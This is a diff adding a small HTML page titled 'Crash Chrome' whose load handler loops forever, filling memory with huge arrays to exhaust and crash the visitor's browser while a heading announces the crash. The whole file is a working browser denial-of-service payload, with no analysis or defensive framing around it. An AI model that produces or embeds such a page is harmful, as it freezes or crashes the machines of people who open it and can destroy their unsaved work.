@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>💥 Crash Chrome</title>
+  <script>
+    window.onload = function () {
+      const junk = [];
+      while (true) {
+        junk.push(new Array(1e6).fill("💥💥💥"));
+      }
+    };
+  </script>
+</head>
+<body>
+  <h1 style="text-align:center; font-family:sans-serif; margin-top:20%;">💣 Triggering memory crash...</h1>
+</body>
+</html>
